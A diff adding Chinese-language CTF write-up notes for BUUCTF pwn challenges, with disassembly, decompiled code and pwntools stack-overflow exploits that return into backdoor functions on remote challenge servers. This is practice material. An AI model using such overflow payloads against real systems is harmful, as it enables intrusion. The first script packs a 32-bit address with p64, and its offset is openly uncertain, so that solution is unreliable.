@@ -199,6 +199,92 @@ p.interactive()
     PIE:        No PIE (0x8048000)
     Stripped:   No
 ```
+使用ghidra工具可以看到函数调用main -> vuln用fget获取长度32的输入数据，很多解题思路说fgets有漏洞，其实不是的，是后面的strcpy的漏洞，因为fgets是有限制长度的，strcpy没有长度限制的copy才有的缓冲区溢出 -> replace把I替换成you -> vuln的strcpy -> 这里溢出跳到get_flag函数。。。
+```sh
+080491af <vuln>:
+ 80491af:	55                   	push   %ebp
+ 80491b0:	89 e5                	mov    %esp,%ebp
+ 80491b2:	53                   	push   %ebx
+ 80491b3:	83 ec 54             	sub    $0x54,%esp
+ 80491b6:	c7 04 24 00 98 04 08 	movl   $0x8049800,(%esp)
+ 80491bd:	e8 5e fb ff ff       	call   8048d20 <printf@plt>
+ 80491c2:	a1 a4 b0 04 08       	mov    0x804b0a4,%eax
+ 80491c7:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80491cb:	c7 44 24 04 20 00 00 	movl   $0x20,0x4(%esp)
+ 80491d2:	00 
+ 80491d3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
+ 80491d6:	89 04 24             	mov    %eax,(%esp)
+ 80491d9:	e8 92 fa ff ff       	call   8048c70 <fgets@plt>
+ 80491de:	8d 45 c4             	lea    -0x3c(%ebp),%eax
+ 80491e1:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 80491e5:	c7 04 24 ac b0 04 08 	movl   $0x804b0ac,(%esp)
+ 80491ec:	e8 df f9 ff ff       	call   8048bd0 <_ZNSsaSEPKc@plt>
+```
+`lea    -0x3c(%ebp),%eax`从0x3c=60开始读取？所以填充长度应该是60+4?
+```py
+from pwn import *
+
+p = remote('node5.buuoj.cn',27453)
+offset = 60 // 3
+backdoor = 0x08048f0d
+payload = b'A' * 4 + b'I' * offset + p64(backdoor + 1)
+p.sendline(payload)
+p.interactive()
+```
+
+## [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)
+```sh
+0000000000400596 <callsystem>:
+  400596:	55                   	push   %rbp
+  400597:	48 89 e5             	mov    %rsp,%rbp
+  40059a:	bf 84 06 40 00       	mov    $0x400684,%edi
+  40059f:	e8 bc fe ff ff       	callq  400460 <system@plt>
+  4005a4:	5d                   	pop    %rbp
+  4005a5:	c3                   	retq  
+
+00000000004005a6 <vulnerable_function>:
+  4005a6:	55                   	push   %rbp
+  4005a7:	48 89 e5             	mov    %rsp,%rbp
+  4005aa:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
+  4005ae:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+  4005b2:	ba 00 02 00 00       	mov    $0x200,%edx
+  4005b7:	48 89 c6             	mov    %rax,%rsi
+  4005ba:	bf 00 00 00 00       	mov    $0x0,%edi
+  4005bf:	e8 ac fe ff ff       	callq  400470 <read@plt>
+  4005c4:	c9                   	leaveq 
+  4005c5:	c3                   	retq  
+```
+```c++
+void vulnerable_function(void)
+
+{
+  undefined1 local_88 [128];
+  
+  read(0,local_88,0x200);
+  return;
+}
+```
+```py
+from pwn import *
+
+p = remote('node5.buuoj.cn',28440)
+offset = 128 + 8
+backdoor = 0x400596
+payload = b'A' * offset + p64(backdoor + 1)
+p.sendline(payload)
+p.interactive()
+```
+
+## [PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)
+```sh
+$ pwn checksec ./pwn
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+```
+开启了Canary的
 
 
 [back](./)
